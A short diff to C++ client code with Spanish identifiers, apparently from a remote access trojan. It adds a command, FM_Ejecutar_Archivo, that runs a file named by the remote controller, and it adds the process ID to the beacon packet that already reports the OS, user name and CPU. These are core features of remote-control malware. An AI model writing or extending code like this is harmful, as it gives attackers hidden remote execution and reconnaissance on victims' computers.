@@ -277,6 +277,19 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         th.detach();
         return;
     }
+
+    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Ejecutar_Archivo){
+        bool isOK = Execute(strIn[1].c_str(), strIn[2] == "1" ? 1 : 0);
+#ifdef ___DEBUG_
+        if(isOK){
+            std::cout<<strIn[1]<<" - ejecutado"<<std::endl;
+        } else {
+            std::cout<<"[X] Error ejecutando "<<strIn[1]<<std::endl;
+            error();
+        }
+#endif
+        return;
+    }
     //#####################################################
     //#####################################################
 
@@ -369,6 +382,8 @@ void Cliente::iniPacket() {
     strOut += strOS();
     strOut.append(1, '\\');
     strOut += strUserName();
+    strOut.append(1, '\\');
+    strOut += std::to_string(GetCurrentProcessId());
     strOut.append(1, '\\');
     strOut += strCpu();
     
